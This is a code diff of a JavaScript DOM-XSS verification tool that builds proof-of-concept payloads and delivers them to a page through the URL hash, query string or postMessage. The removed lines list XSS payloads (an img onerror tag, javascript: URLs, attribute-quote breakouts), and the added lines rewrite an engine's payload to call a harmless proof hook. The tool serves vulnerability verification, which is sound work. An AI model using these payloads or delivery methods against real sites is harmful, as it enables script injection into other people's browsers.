@@ -6673,32 +6673,27 @@ function _htmlHoleContext(prefix) {
   if (quote) return quote === '"' ? "attr-dq" : "attr-sq";
   return inTag ? "tag" : "text";
 }
-function buildPocFromShape(sinkName, shape, pageUrl, marker) {
-  if (!shape || !pageUrl) return { pocJs: null, why: "missing shape/pageUrl" };
-  var m = /\{(hash|search|pm|reply)\}/.exec(shape);   // the FIRST attacker-controlled (source-tagged) hole
+// ENGINE AGREEMENT: the live PoC is the ENGINE's exact solved breakout input (its `poc` field) — the input
+// a candidate-replay flow drove through the REAL page code+branches+filters to the sink where it broke out.
+// We do NOT re-derive a payload from the shape (that second solver would diverge: it wouldn't carry the
+// gate-guided prefix like `cmd:`, a filter bypass, or the exact transform-surviving form the engine found).
+// We only (a) map the engine's fire-marker X9 -> the verifier's proof hook apiclientsink(marker), and
+// (b) DELIVER it to the REAL page via the source (hash/search/pm), so real Chrome — not the model — is the
+// ground truth. Disagreement (engine says breakout, Chrome doesn't fire) is a precise engine-fidelity bug.
+function buildPocFromShape(sinkName, poc, shape, pageUrl, marker) {
+  if (!poc || !pageUrl) return { pocJs: null, why: "missing engine poc / pageUrl" };
+  if (!shape) return { pocJs: null, why: "missing source shape" };
+  var m = /\{(hash|search|pm|reply)\}/.exec(shape);   // which attacker-controlled source the engine's poc rides
   if (!m) return { pocJs: null, why: "hole source unknown (generic {}) — no delivery vector; complete source-tagging first" };
   var source = m[1];
-  var prefix = shape.slice(0, m.index);
   var call = "apiclientsink('" + marker + "')";           // the verifier's proof hook (marker = crypto.randomUUID)
-  // Slash-separated attributes (no spaces) so the payload survives URL-fragment/query delivery intact.
-  var htmlCore = "<img/src=x/onerror=" + call + ">";
-  var context, payload;
-  if (sinkName === "eval") {
-    context = "js";
-    payload = call + ";//";                                // raw JS statement; trailing // neutralises the suffix
-  } else if (sinkName === "href" || sinkName === "setAttribute") {
-    context = "url";
-    payload = "javascript:" + call;                        // href/action/formaction navigation sink
-  } else {                                                 // innerHTML/outerHTML/insertAdjacentHTML/document.write
-    var hc = _htmlHoleContext(prefix);
-    context = "html-" + hc;
-    if (hc === "attr-dq") payload = '">' + htmlCore;       // break out of ="…"
-    else if (hc === "attr-sq") payload = "'>" + htmlCore;  // break out of '…'
-    else if (hc === "tag") payload = ">" + htmlCore;       // close the open tag, then inject
-    else payload = htmlCore;                               // text content: inject directly
-  }
-  // Delivery: how the attacker gets `payload` into the hole. The SAME payload string fills the hole; the
-  // vector is the source. pocJs is eval'd in the sandbox (real user gesture), so window.open is allowed.
+  // The engine's X9 is a bare fire-marker: `onerror=X9`, `javascript:X9`, `1;X9();//`. Map every X9 (call or
+  // ref form) to the apiclientsink CALL so the real sink, on firing, relays the proof. This is the ONLY edit
+  // to the engine's payload — its structure (breakout + gate prefix + surviving transforms) is untouched.
+  var payload = String(poc).split("X9()").join(call).split("X9").join(call);
+  var context = "engine:" + (sinkName || "?");
+  // Delivery: how the attacker gets `payload` into the source hole. pocJs is eval'd in the sandbox (real user
+  // gesture), so window.open is allowed; it navigates to the REAL page with the payload in the real source.
   var base, delivery, pocJs;
   if (source === "hash") {
     base = pageUrl.split("#")[0] + "#" + payload;
@@ -6720,8 +6715,8 @@ function buildPocFromShape(sinkName, shape, pageUrl, marker) {
 }
 function startExploitProbe(msg) {
   _pruneProbeSessions();
-  const { strategy, waitMs, findingId, paramName, fieldPath, sinkType, sinkName, decoders, preconditions, pocPlan, shape } = msg || {};
-  if (!strategy && !pocPlan && !shape) throw new Error("need a taint shape (from the @S finding), or a strategy / pocPlan");
+  const { strategy, waitMs, findingId, paramName, fieldPath, sinkType, sinkName, decoders, preconditions, pocPlan, shape, poc } = msg || {};
+  if (!poc && !strategy && !pocPlan && !shape) throw new Error("need the engine's poc + shape (from the @S finding)");
   if (strategy === "search" && !paramName) {
     throw new Error("search strategy requires paramName — derive it from the finding's observed source (e.g. the argument to URLSearchParams.get)");
   }
@@ -6772,7 +6767,7 @@ function startExploitProbe(msg) {
   // Compile THE PoC by REVERSING the captured @S taint shape (opaque provenance): parse context around
   // the source-tagged hole → context-appropriate payload calling the verifier's apiclientsink(marker) →
   // delivery from the source tag. No solver, no template. Feeds the EXISTING PROBE_HIT correlation.
-  var _poc = shape ? buildPocFromShape(sinkName || sinkType, shape, session.pageUrl, marker) : null;
+  var _poc = (poc && shape) ? buildPocFromShape(sinkName || sinkType, poc, shape, session.pageUrl, marker) : null;
   session.pocJs = (_poc && _poc.pocJs) || null;
   session.pocMeta = _poc ? { context: _poc.context, source: _poc.source, payload: _poc.payload, delivery: _poc.delivery } : null;
   session.pocWhy = _poc && !_poc.pocJs ? _poc.why : null;   // @WHY when a shape can't yield a client-deliverable PoC
